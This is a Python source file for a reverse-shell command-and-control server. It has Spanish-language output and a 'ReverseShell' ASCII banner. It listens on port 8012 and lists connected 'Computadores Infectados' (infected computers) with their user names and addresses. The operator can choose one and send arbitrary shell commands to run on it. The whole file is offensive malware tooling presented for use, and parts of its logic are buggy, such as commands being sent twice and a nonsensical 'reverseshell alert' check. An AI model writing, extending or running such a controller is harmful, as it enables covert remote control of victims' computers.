from os import system
import socket
from threading import Thread
from colorama import init, Fore, Style
import platform

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8012
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

init()

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)

if platform.system() == 'Windows': 
    clear = 'cls'
else: 
    clear = 'clear'
in_menu = True
clients = []

def add_client(connection, addr):
    clients.append({ "conn": connection, "cwd": connection.recv(BUFFER_SIZE).decode(), "addr": addr, "user": connection.recv(BUFFER_SIZE).decode() })
    if in_menu: update_screen()

def start():
    while True:
        client_socket, client_address = s.accept()
        Thread(target = add_client(client_socket, client_address)).start()
    
def connect(socket):
    global in_menu
    try:
        socket["conn"].send("test".encode())
        condition = True
    except:
        condition = False
    if condition:
        in_menu = False
        client_socket = socket["conn"]
        cwd = socket["cwd"]
        system(clear)
        while True:
            try:
                command = input(f"{cwd} #> ")
                if not command.strip():
                    continue
                client_socket.send(command.encode())
                if command.lower() == "exit":
                    break
                elif command.lower() == clear:
                    system(clear)
                    continue
                elif command.lower() == "reverseshell alert " and command.strip()[3] and command.strip()[2]:
                    continue
                client_socket.send(command.encode())
                output = client_socket.recv(BUFFER_SIZE).decode()
                print(output)
                results, cwd = output.split(SEPARATOR)
                print(results)
            except:
                print("¡Ha ocurrido un error!")
                break
        in_menu = True
        update_screen()
    else:
        update_screen()

def update_screen():
    system(clear)
    print(Fore.CYAN +  "\n   ______                                     ______ _           _ _  \n  (_____ \                                   / _____) |         | | | \n   _____) )_____ _   _ _____  ____ ___ _____( (____ | |__  _____| | | \n  |  __  /| ___ | | | | ___ |/ ___)___) ___ |\____ \|  _ \| ___ | | | \n  | |  \ \| ____|\ V /| ____| |  |___ | ____|_____) ) | | | ____| | | \n  |_|   |_|_____) \_/ |_____)_|  (___/|_____|______/|_| |_|_____)\_)_)\n  " + Style.RESET_ALL)
    print("  Computadores Infectados :\n")
    for i in range(0, len(clients)):
        try:
            clients[i]["conn"].send("test".encode())
            condition = True
        except:
            condition = False
        if condition:
            print("        {1} : {0} {2}".format(clients[i]["user"], i + 1, clients[i]["addr"]))


Thread(target = start).start()

while True:
    update_screen()
    function = input("\n  Connect #> ")
    try:
        connect(clients[int(function) - 1])
    except:
        False
